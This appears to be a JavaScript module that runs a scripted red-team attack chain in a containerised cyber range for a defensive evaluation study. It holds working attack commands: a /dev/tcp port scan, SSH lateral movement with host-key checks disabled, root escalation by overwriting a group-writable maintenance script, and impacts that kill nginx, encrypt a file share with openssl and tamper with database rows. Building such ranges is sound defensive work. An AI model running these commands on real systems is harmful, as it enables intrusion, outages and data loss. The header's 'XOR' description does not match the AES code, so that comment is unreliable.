// R0 red chain (M2; tasks/R0-PILOT-PREREG.md, "Red" and "Change before any episode"). Misconfiguration only, NO
// exploits, no sudo, no cron. This file lives only under observatory/cyber/range/red/ and is left out of every review
// copy (prereg "Rules and limits"; the r0-pilot spec's review list names the runnable files and never this folder).
//
// The chain, one assume-breach workstation (seed-chosen), then four stages and one impact:
//   1 discovery   : a host/port scan inside the range only (bash /dev/tcp), from the breached workstation.
//   2 lateral     : ssh into the service account (uid 1000) that runs each server's high-port sshd, with the reused
//                   synthetic key. Red keeps an interactive shell on the target, so its shell is a new process key.
//   3 escalation  : as svc, overwrite the group-writable (0775, group svc) maintenance script /pod/maint/tick.sh on
//                   the target. The target's uid-0 maintenance loop runs red's content as uid 0 on the next cycle
//                   (no setuid, no sudo, no cron). Red's content spawns a distinct uid-0 process, so the host shows a
//                   suspicious uid-0 process, and the script's hash differs from the frozen baseline.
//   4 persistence : red's content stays in that same script and is re-run every cycle (no crontab).
//   impact (seeded target): stop web (kill nginx), reversibly XOR-encrypt the files share, or alter synthetic db rows.
//
// Red does not adapt to blue; it advances one stage when its condition holds, after a seeded wait. A blue Restore that
// recreates a held host resets that host, and red re-runs from any foothold that survives (handled by the runner, which
// re-invokes step()). Red's exec carries NO harness token, so the sensor sees every red process and connection.
import { spawnSync } from 'node:child_process';
import { rng } from '../green/green.mjs';

export const STAGES = ['none', 'discovery', 'lateral', 'escalation', 'persistence', 'impact'];
export const IMPACTS = ['web', 'files', 'db'];

// red's maintenance-script payload: runs as uid 0 each cycle; writes a marker and spawns a distinct root process
// (tail), so the host shows a suspicious uid-0 process and the script hash differs from the baseline.
export const RED_TICK = '#!/bin/sh\necho "r0-red root $(id -u)" > /pod/maint/.red\nmaint $(date -u +%s) > /pod/maint/state 2>/dev/null\ntimeout 2 tail -f /dev/null\n';

// Pick the breach workstation and impact target from the seed. Pure, unit-tested.
export function plan(seed) {
  const r = rng(seed ^ 0x51ed270b);
  const ws = ['ws1', 'ws2', 'ws3'][Math.floor(r() * 3)];
  const target = ['web', 'files', 'db'][Math.floor(r() * 3)];
  const impact = IMPACTS[Math.floor(r() * 3)];
  // seeded per-stage waits (in steps) before each advance, small so a 300-step episode reaches impact well before the end
  const waits = { discovery: 1 + Math.floor(r() * 3), lateral: 1 + Math.floor(r() * 3), escalation: 2 + Math.floor(r() * 3), persistence: 1 + Math.floor(r() * 2), impact: 1 + Math.floor(r() * 3) };
  return { ws, target, impact, waits };
}

// Advance logic (pure, unit-tested): given the current stage, the steps spent in it, the stage waits, and whether the
// current foothold still holds, return the next stage to be in. Red waits `waits[next]` steps in the current stage
// before moving on; if the foothold was lost it falls back to the furthest surviving stage the runner reports.
export function nextStage(cur, waited, waits, footholdOk) {
  if (!footholdOk) return 'discovery'; // a surviving breach workstation always allows re-discovery
  const order = STAGES;
  const i = order.indexOf(cur);
  if (i >= order.length - 1) return cur; // at impact: stay
  const need = waits[order[i + 1]] ?? 1;
  return waited >= need ? order[i + 1] : cur;
}

const dx = (args, opts = {}) => spawnSync('docker', args, { encoding: 'utf8', timeout: 25000, ...opts });
// red runs from the breached workstation's service container; no harness token, so the sensor flags it.
const onWs = (red, argv, input) => dx(['exec', '-i', red.wsSvc, ...argv], input ? { input } : {});
const SSH = (ip, cmd) => ['ssh', '-i', '/tmp/rk', '-p', '2222', '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'BatchMode=yes', `svc@${ip}`, cmd];

export class Red {
  // opts: { pods, keyPath (reused synthetic key, placed on the breach workstation), seed }
  constructor({ pods, keyPath, seed }) {
    this.P = Object.fromEntries(pods.map((p) => [p.host, p]));
    this.keyPath = keyPath; this.pl = plan(seed);
    this.wsSvc = this.P[this.pl.ws].service;
    this.stage = 'none'; this.waited = 0; this.furthest = 'none';
    this.impacted = { web: false, files: false, db: false };
    this.firstImpactStep = null; this.log = [];
    this.held = new Set(); // server hosts where red has a shell foothold
  }
  placeKey(fs) { onWs(this, ['sh', '-c', 'cat > /tmp/rk && chmod 600 /tmp/rk'], fs.readFileSync(this.keyPath)); }

  discovery() {
    const ips = Object.values(this.P).map((p) => `${p.host} ${p.ip}`);
    const script = ips.map(([_]) => '').join('');
    const probe = Object.values(this.P).map((p) => `(timeout 2 bash -c 'echo > /dev/tcp/${p.ip}/2222' 2>/dev/null && echo up ${p.host}) &`).join('\n') + '\nwait;true';
    onWs(this, ['bash', '-c', probe]);
    return { note: 'scan' };
  }
  lateral() {
    const t = this.P[this.pl.target];
    // open a persistent interactive shell on the target (a new process key under its sshd), as the svc account
    dx(['exec', '-d', this.wsSvc, ...SSH(t.ip, 'nohup sh -c "exec sleep 600" >/dev/null 2>&1 & echo ok')]);
    this.held.add(this.pl.target);
    return { note: `ssh ${this.pl.target}` };
  }
  escalation() {
    const t = this.P[this.pl.target];
    // overwrite the group-writable maintenance script via the ssh foothold (svc may write 0775 group svc)
    const r = onWs(this, SSH(t.ip, `cat > /pod/maint/tick.sh <<'RT'\n${RED_TICK}RT`));
    return { note: `overwrite tick.sh on ${this.pl.target}`, ok: r.status === 0 };
  }
  persistence() { return { note: 'script re-run every cycle (no cron)' }; } // the stage-3 overwrite is the persistence
  impact() {
    const which = this.pl.impact, t = this.P[which];
    if (which === 'web') onWs(this, SSH(t.ip, 'pkill -f nginx || kill -TERM $(pgrep -f "nginx: master") 2>/dev/null; true'));
    else if (which === 'files') onWs(this, SSH(t.ip, 'for f in /home/svc/share/*; do [ -f "$f" ] || continue; openssl enc -aes-128-cbc -pbkdf2 -k r0red -in "$f" -out "$f.enc" 2>/dev/null && mv "$f.enc" "$f"; done; echo done'));
    else onWs(this, SSH(t.ip, "psql -h 127.0.0.1 -U svc -d postgres -c \"UPDATE r0_rows SET val='tampered';\" 2>/dev/null; true"));
    this.impacted[which] = true;
    return { note: `impact ${which}`, which };
  }

  // One red step. footholdOk: does red still hold its target (false after a blue Restore of it)? Returns the stage now.
  step(i, { footholdOk = true } = {}) {
    if (this.stage !== 'none' && !footholdOk && this.held.has(this.pl.target)) this.held.delete(this.pl.target);
    const next = this.stage === 'none' ? 'discovery' : nextStage(this.stage, this.waited, this.pl.waits, footholdOk && (this.stage === 'discovery' || this.held.has(this.pl.target)));
    if (next === this.stage) this.waited++;
    else { this.waited = 0; this.stage = next; this.act(i, next); }
    if (STAGES.indexOf(this.stage) > STAGES.indexOf(this.furthest)) this.furthest = this.stage;
    return this.stage;
  }
  act(i, stage) {
    let r = {};
    if (stage === 'discovery') r = this.discovery();
    else if (stage === 'lateral') r = this.lateral();
    else if (stage === 'escalation') r = this.escalation();
    else if (stage === 'persistence') r = this.persistence();
    else if (stage === 'impact') { r = this.impact(); if (this.firstImpactStep == null) this.firstImpactStep = i; }
    this.log.push({ step: i, stage, ...r });
  }
}

if (import.meta.url === `file://${process.argv[1]}`) { console.error('red.mjs is a module driven by episode.mjs; it is never run by hand or sent to a model.'); process.exit(2); }
